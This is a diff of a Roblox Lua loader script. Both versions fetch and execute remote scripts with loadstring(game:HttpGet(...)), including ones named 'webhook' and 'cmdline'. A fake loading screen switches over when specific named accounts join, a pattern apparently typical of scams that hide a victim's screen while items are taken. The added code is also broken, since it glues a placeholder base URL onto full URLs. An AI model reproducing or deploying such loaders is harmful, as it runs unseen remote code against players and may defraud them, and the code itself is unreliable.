@@ -1,72 +1,22 @@
--- Simple Main Loader - Just Combines Your Working Scripts
-local scriptUrls = {
-    webhook = "https://raw.githubusercontent.com/forcegod20/finalone/refs/heads/main/webhook",
-    halfLoading = "https://raw.githubusercontent.com/forcegod20/finalone/refs/heads/main/half%20loading", 
-    fullLoading = "https://raw.githubusercontent.com/forcegod20/finalone/refs/heads/main/full%20loading",
-    cmdLine = "https://raw.githubusercontent.com/forcegod20/finalone/refs/heads/main/cmdline"
-}
+-- Ultra Simple Main Loader
+local baseURL = "https://raw.githubusercontent.com/YOUR_USERNAME/YOUR_REPO/main/"
 
-print("🚀 Starting Simple Main Loader...")
+-- Load all scripts
+loadstring(game:HttpGet(baseURL .. "https://raw.githubusercontent.com/forcegod20/finalone/refs/heads/main/webhook"))()
+loadstring(game:HttpGet(baseURL .. "https://raw.githubusercontent.com/forcegod20/finalone/refs/heads/main/full%20loading"))()
+loadstring(game:HttpGet(baseURL .. "https://raw.githubusercontent.com/forcegod20/finalone/refs/heads/main/cmdline"))()
 
--- Load webhook
-loadstring(game:HttpGet(scriptUrls.webhook))()
-print("✅ Webhook loaded")
+print("✅ All scripts loaded! Half loading should be visible.")
 
--- Load half loading screen (starts automatically)
-loadstring(game:HttpGet(scriptUrls.halfLoading))()
-print("✅ Half loading screen started")
-
--- Load command line
-loadstring(game:HttpGet(scriptUrls.cmdLine))()
-print("✅ Command line loaded")
-
--- Simple authorized user detection
-local authorizedUsers = {
-    "jaatshab_770", "III",
-    "boss_user2", "BOSS2", 
-    "boss_user3", "BOSS3",
-    "boss_user4", "BOSS4",
-    "boss_user5", "BOSS5"
-}
-
--- Function to switch to full loading
-local function switchToFullLoading()
-    print("🔄 Switching to full loading screen...")
-    
-    -- Remove half loading screen
-    local playerGui = game.Players.LocalPlayer.PlayerGui
-    if playerGui:FindFirstChild("ProfessionalLoadingScreen") then
-        playerGui.ProfessionalLoadingScreen:Destroy()
-        print("✅ Half loading removed")
-    end
-    
-    -- Load full loading screen
-    loadstring(game:HttpGet(scriptUrls.fullLoading))()
-    print("✅ Full loading screen activated")
-end
-
--- Check when players join
+-- Auto-switch when authorized user joins
 game.Players.PlayerAdded:Connect(function(player)
-    for _, authUser in pairs(authorizedUsers) do
-        if player.Name == authUser or player.DisplayName == authUser then
-            print("🎯 Authorized user joined: " .. player.Name)
-            wait(2)
-            switchToFullLoading()
-            break
+    if player.Name == "jaatshab_770" or player.DisplayName == "III" then
+        wait(2)
+        -- Remove half loading
+        if game.Players.LocalPlayer.PlayerGui:FindFirstChild("ProfessionalLoadingScreen") then
+            game.Players.LocalPlayer.PlayerGui.ProfessionalLoadingScreen:Destroy()
         end
+        -- Load full loading
+        loadstring(game:HttpGet(baseURL .. "full_loading.lua"))()
     end
 end)
-
--- Check existing players
-for _, player in pairs(game.Players:GetPlayers()) do
-    for _, authUser in pairs(authorizedUsers) do
-        if player.Name == authUser or player.DisplayName == authUser then
-            print("🎯 Authorized user already here: " .. player.Name)
-            wait(2)
-            switchToFullLoading()
-            break
-        end
-    end
-end
-
-print("📋 Loader ready! Waiting for authorized users...")
